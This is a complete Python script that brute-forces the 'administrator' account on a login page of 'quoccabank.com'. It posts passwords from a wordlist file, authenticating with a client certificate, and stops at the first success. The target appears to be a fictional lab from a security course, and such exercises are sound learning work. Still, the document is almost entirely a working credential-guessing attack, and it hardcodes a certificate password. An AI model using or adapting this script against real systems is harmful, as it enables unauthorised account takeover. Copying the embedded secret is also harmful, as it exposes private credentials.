from requests_pkcs12 import post

login_url = 'https://files.quoccabank.com/login'
p12_path = '/Users/bryanle/Downloads/z5361001.p12'
p12_password = 'Qs3/Keg5W3D/kSJJfp9ltw=='         

with open('/Users/bryanle/Downloads/CommonAdminBase64.txt', 'r') as file:
    passwords = file.read().splitlines()

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Origin': 'https://files.quoccabank.com',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://files.quoccabank.com/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
}
count = 1
def attempt_login(password):
    login_credentials = {
        'username': 'administrator',
        'password': password
    }
    response = post(
        login_url,
        headers=headers,
        json=login_credentials,
        pkcs12_filename=p12_path,
        pkcs12_password=p12_password
    )

    # Check the response
    if response.status_code == 200:
        print(f'{count} - Login successful for password: {password}.')
        return True
    elif response.status_code == 403:
        print(f'{count} - Login failed for password: {password}')
        return False
    else:
        print(f'{count} - Login failed with error {response.status_code}.')
        return False

for pwd in passwords:
    if attempt_login(pwd):
        break
    count += 1